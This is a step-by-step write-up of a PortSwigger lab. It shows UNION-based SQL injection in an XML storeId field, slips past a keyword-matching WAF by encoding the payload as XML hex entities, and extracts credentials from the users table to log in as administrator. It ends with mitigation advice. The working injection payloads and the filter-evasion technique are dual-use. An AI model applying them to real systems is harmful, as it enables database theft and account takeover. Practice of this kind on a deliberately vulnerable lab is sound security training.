# 📘 PortSwigger Lab: SQL Injection with Filter Bypass via XML Encoding

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding  
> 🎯 Topic: SQL Injection in XML + WAF bypass via XML Entity Encoding

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 What We Learn](#theory)
- [🧩 Core Idea](#idea)
- [🔍 Step 1 — Find the XML Request](#step1)
- [🔍 Step 2 — Check Whether storeId Is Evaluated](#step2)
- [🔍 Step 3 — Test UNION SELECT NULL](#step3)
- [🔍 Step 4 — Understand the WAF Block](#step4)
- [🔍 Step 5 — Bypass the WAF with XML Encoding](#step5)
- [🔍 Step 6 — Determine the Number of Columns](#step6)
- [🔍 Step 7 — Retrieve username and password](#step7)
- [🔍 Step 8 — Log in as administrator](#step8)
- [🧩 Payloads Used](#payloads)
- [🔬 Main Payload Breakdown](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [💡 Key Takeaways](#remember)
- [🛡 Mitigation](#defense)
- [🎓 Interview Questions](#interview)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Find a SQL injection vulnerability in the stock check feature, bypass the WAF using XML Entity Encoding, retrieve the `administrator` credentials, and log in to the administrator account.

---

<a id="theory"></a>

## 🧠 What We Learn

In previous labs, SQL injection was usually found in URLs, cookies, or query strings. In this lab, the injection point is inside an XML request:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

The main idea:

```text
SQL injection can exist in any user-controlled input if that input reaches a SQL query.
```

The input format can be anything:

```text
URL parameters
Cookies
Headers
JSON
XML
GraphQL
multipart/form-data
```

This lab uses XML. This matters because XML supports entities, for example:

```xml
&#x53;
```

After XML decoding, this becomes:

```text
S
```

So this string:

```xml
&#x53;ELECT
```

becomes this on the server side:

```sql
SELECT
```

---

<a id="idea"></a>

## 🧩 Core Idea

The WAF inspects the raw HTTP request and blocks obvious SQL injection keywords:

```text
UNION
SELECT
FROM
```

However, the application processes the XML through an XML parser. The XML parser decodes XML entities, and only after that the value reaches the SQL engine.

The chain looks like this:

```text
HTTP Request
    ↓
WAF sees encoded payload
    ↓
XML Parser decodes payload
    ↓
SQL receives normal UNION SELECT
    ↓
Database executes the query
```

So we are not tricking SQL. We are bypassing a weak WAF that does not normalize XML before inspection.

---

<a id="step1"></a>

## 🔍 Step 1 — Find the XML Request

In Burp Suite, intercept the stock check request. It is sent to an endpoint similar to:

```http
POST /product/stock
```

Request body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

The interesting field is:

```xml
<storeId>1</storeId>
```

According to the lab description, the stock check feature is vulnerable.

---

<a id="step2"></a>

## 🔍 Step 2 — Check Whether storeId Is Evaluated

Change:

```xml
<storeId>1</storeId>
```

to:

```xml
<storeId>1+1</storeId>
```

If the response changes and the application shows stock for another store, SQL evaluated the expression `1+1`.

A possible server-side SQL query could look like this:

```sql
SELECT stock
FROM stock
WHERE product_id = 1
AND store_id = 1+1
```

SQL evaluates:

```text
1+1 = 2
```

Conclusion:

```text
storeId reaches SQL as an expression.
This is a strong sign of SQL Injection.
```

---

<a id="step3"></a>

## 🔍 Step 3 — Test UNION SELECT NULL

Now we check whether we can append a second SELECT using UNION.

Payload:

```sql
1 UNION SELECT NULL
```

Inside XML:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Result:

```text
Attack detected
```

This is an important result. It does not mean there is no SQL injection. It means the request was blocked by the WAF.

---

<a id="step4"></a>

## 🔍 Step 4 — Understand the WAF Block

The WAF detected obvious SQL injection keywords in the raw request:

```text
UNION
SELECT
```

So it blocked the request before it reached the application and the SQL engine.

Logic:

```text
1 UNION SELECT NULL
        ↓
WAF sees UNION SELECT
        ↓
Attack detected
```

If we encode only one letter, for example:

```xml
1 UNION &#x53;ELECT NULL
```

the WAF may still block the request because it can still see:

```text
UNION
```

So it is not enough to encode one letter. We need to encode the whole payload.

---

<a id="step5"></a>

## 🔍 Step 5 — Bypass the WAF with XML Encoding

In Burp Repeater, select the full payload:

```sql
1 UNION SELECT NULL
```

Then use Hackvertor:

```text
Extensions → Hackvertor → Encode → hex_entities
```

Hackvertor converts the string into XML hex entities. It will look approximately like this:

```xml
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```

The WAF no longer sees the clear text:

```text
UNION SELECT
```

But the server-side XML parser decodes the entities back into:

```sql
1 UNION SELECT NULL
```

---

<a id="step6"></a>

## 🔍 Step 6 — Determine the Number of Columns

After XML encoding, the payload passes and the response becomes something like:

```text
992 units
null
```

The appearance of `null` means that:

```sql
UNION SELECT NULL
```

was executed successfully.

Because one `NULL` worked, we can conclude:

```text
The original SQL query returns one column.
```

If the original query returned two columns, we would need:

```sql
UNION SELECT NULL,NULL
```

But here, one column is enough.

---

<a id="step7"></a>

## 🔍 Step 7 — Retrieve username and password

The `users` table contains two useful columns:

```text
username
password
```

But the original query returns only one column. Therefore, we cannot use:

```sql
UNION SELECT username, password FROM users
```

That would return two columns and would not match the original query.

We need to concatenate the username and password into one string:

```sql
username || '~' || password
```

Main payload:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The `~` character is used as a separator, so it is easy to distinguish the username from the password:

```text
administrator~password
```

Then select the full payload and encode it again using:

```text
Hackvertor → Encode → hex_entities
```

After sending the request, the response contains:

```text
carlos~534wzu8n0vot9h2k2f7b
wiener~dh20dxulzd2dfo7lnmaw
administrator~x8kjtwv2l0yg43xwehdo
992 units
```

The useful line is:

```text
administrator~x8kjtwv2l0yg43xwehdo
```

---

<a id="step8"></a>

## 🔍 Step 8 — Log in as administrator

Go to:

```text
My account
```

Use the recovered credentials.

<details>
<summary>🔑 Show administrator password</summary>

```text
Username: administrator
Password: x8kjtwv2l0yg43xwehdo
```

</details>

After logging in, the lab is solved.

---

<a id="payloads"></a>

## 🧩 Payloads Used

Expression evaluation test:

```xml
<storeId>1+1</storeId>
```

UNION test without WAF bypass:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Result:

```text
Attack detected
```

UNION test after XML encoding:

```sql
1 UNION SELECT NULL
```

Payload is encoded with:

```text
Hackvertor → Encode → hex_entities
```

Credential extraction:

```sql
1 UNION SELECT username || '~' || password FROM users
```

This payload is also encoded with:

```text
Hackvertor → Encode → hex_entities
```

---

<a id="breakdown"></a>

## 🔬 Main Payload Breakdown

Main payload:

```sql
1 UNION SELECT username || '~' || password FROM users
```

Breakdown:

`1` — a valid normal `storeId` value that lets us continue the SQL expression.

`UNION` — combines the result of the original SELECT with the result of our injected SELECT.

`SELECT` — starts our injected query.

`username` — retrieves the username column.

`||` — string concatenation operator.

`'~'` — separator between username and password.

`password` — retrieves the password column.

`FROM users` — tells SQL to read from the table that stores credentials.

The final output looks like this:

```text
administrator~x8kjtwv2l0yg43xwehdo
```

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

The correct thought process was:

```text
1. Find a controllable XML field.
2. Check whether 1+1 is evaluated.
3. Test UNION SELECT NULL.
4. See Attack detected and identify WAF blocking.
5. Bypass the WAF using XML entity encoding.
6. Determine the number of columns.
7. If only one column is returned, concatenate username and password.
8. Retrieve administrator credentials.
```

The key skill is not just knowing the payload. The key skill is understanding where the filter is located:

```text
The WAF is before the XML parser.
```

That is why XML encoding helps pass the filter, while SQL still receives the normal decoded query.

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Encoding only SELECT

Example:

```xml
1 UNION &#x53;ELECT NULL
```

This may still fail because the WAF can still see:

```text
UNION
```

### 2. Not encoding the whole payload

The whole string should be encoded:

```sql
1 UNION SELECT NULL
```

not just individual letters.

### 3. Reading users immediately

Do not start with:

```sql
SELECT * FROM users
```

First, determine whether UNION works and how many columns the original query returns.

### 4. Using two columns

This is wrong in this lab:

```sql
UNION SELECT username, password FROM users
```

because the original query returns only one column.

### 5. Forgetting Hackvertor

Manually encoding a large payload is slow and error-prone. Hackvertor does it faster and more reliably.

---

<a id="remember"></a>

## 💡 Key Takeaways

- SQL injection is not limited to URL parameters.
- XML fields can also reach SQL queries.
- `1+1` helps test whether input is evaluated as a SQL expression.
- `UNION SELECT NULL` is used to test UNION and column count.
- `Attack detected` in this lab means WAF blocking.
- The WAF checks the raw HTTP request.
- The XML parser decodes entities before passing data further.
- XML encoding can hide SQLi payloads from weak WAFs.
- If there is only one output column, multiple values must be concatenated.
- `username || '~' || password` returns username and password in one string.

---

<a id="defense"></a>

## 🛡 Mitigation

Proper defenses:

- use parameterized queries;
- never build SQL by string concatenation;
- validate `storeId` as a number;
- normalize input before WAF inspection;
- inspect XML after decoding;
- restrict database user privileges;
- log suspicious XML payloads;
- do not rely only on a WAF.

Weak defense:

```text
Simply searching for UNION and SELECT in the raw HTTP request.
```

That approach can be bypassed with encoding.

---

<a id="interview"></a>

## 🎓 Interview Questions

**Why can SQL injection exist inside XML?**  
Because XML is only a data transport format. If a value from XML is unsafely inserted into SQL, SQL injection is possible.

**Why did `1+1` confirm SQL injection?**  
Because SQL evaluated the expression and returned data for a different `storeId`.

**Why use `UNION SELECT NULL` first?**  
Because `NULL` is compatible with most data types and helps test the number of columns.

**Why did `null` appear in the response?**  
Because our `UNION SELECT NULL` added another row to the result.

**Why could we not use `username, password`?**  
Because the original query returned one column, while `username, password` would return two.

**Why did XML encoding bypass the WAF?**  
Because the WAF saw the encoded payload, while the XML parser later decoded it into normal SQL.

---

<a id="checklist"></a>

## ✅ Checklist

- [x] Stock check XML request found.
- [x] `storeId` field identified.
- [x] `1+1` expression tested.
- [x] SQL expression evaluation confirmed.
- [x] `UNION SELECT NULL` tested.
- [x] WAF blocking identified.
- [x] Payload encoded with Hackvertor.
- [x] One output column identified.
- [x] `username` and `password` retrieved.
- [x] Logged in as `administrator`.

---

# ⬆ Back to Top

[Return to contents](#top)
